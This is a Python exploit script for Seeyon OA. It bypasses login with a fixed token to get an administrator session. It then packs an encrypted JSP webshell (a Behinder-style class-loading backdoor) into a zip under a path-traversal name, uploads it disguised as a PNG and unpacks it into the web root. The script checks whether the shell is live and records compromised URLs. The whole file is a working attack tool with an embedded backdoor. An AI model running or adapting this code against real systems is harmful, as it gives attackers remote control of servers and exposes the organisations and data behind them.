import random
import re
import zipfile
import requests
import time
import buter

filename = "./reps/seeyou管理员任意登陆导致文件上传RCE-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }


la = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
           'Content-Type': 'application/x-www-form-urlencoded'}

def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str

mm = generate_random_str(8)

webshell_name1 = mm+'.jsp'
webshell_name2 = '../'+webshell_name1

def file_zip():
    # shell = 'test'   ## 替换shell内容
    # 冰鞋3.0 默认密码 rebeyond
    shell = '''<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>'''
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(webshell_name2, shell)


def syaloginfileip(urllist):
    url = urllist + '/seeyon/thirdpartyController.do'
    post = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    response = requests.post(url=url, data=post, headers=la)
    if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
        cookie = response.cookies
        cookies = requests.utils.dict_from_cookiejar(cookie)
        jsessionid = cookies['JSESSIONID']
        file_zip()
        print(buter.colors.GREEN+ f'{urllist} 获取cookie成功---->> ' + jsessionid + buter.colors.END)
        fileurl = urllist + '/seeyon/fileUpload.do?method=processUpload&maxSize='
        headersfile = {'Cookie': "JSESSIONID=%s" % jsessionid}
        post = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0',
                'isEncrypt': "0"}
        file = [('file1', ('test.png', open(mm + '.zip', 'rb'), 'image/png'))]
        filego = requests.post(url=fileurl, data=post, files=file, headers=headersfile)
        time.sleep(2)
    else:
        print(buter.colors.RED+ f'{urllist} 获取cookie失败'+buter.colors.END)
        exit()
    if filego.text:
        fileid1 = re.findall('fileurls=fileurls\+","\+\'(.+)\'', filego.text, re.I)
        fileid = fileid1[0]
        if len(fileid1) == 0:
            print(buter.colors.RED+ f'{urllist} 未获取到文件id可能上传失败！' + buter.colors.END)
        print(buter.colors.GREEN+ f'{urllist} 上传成功文件id为---->>:' + fileid + buter.colors.END)
        Date_time = time.strftime('%Y-%m-%d')
        headersfile2 = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': "JSESSIONID=%s" % jsessionid}
        getshellurl = urllist + '/seeyon/ajax.do'
        data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + Date_time + '%22%2C%22' + fileid + '%22%5D'
        getshell = requests.post(url=getshellurl, data=data, headers=headersfile2)
        time.sleep(1)
        webshellurl1 = urllist + '/seeyon/common/designer/pageLayout/' + webshell_name1
        shelllist = requests.get(url=webshellurl1)
        if shelllist.status_code == 200:
            print(buter.colors.GREEN+ f'{urllist} 利用成功webshell地址：' + webshellurl1 + buter.colors.END)
            f = open(filename,"a+",encoding="utf-8")
            f.write(f"{urllist}{webshellurl1} 冰蝎3.0 默认密码 rebeyond")
            f.write("\n")
            f.close()
        else:
            print(buter.colors.RED +  f'{urllist} 未找到webshell利用失败'+ buter.colors.END)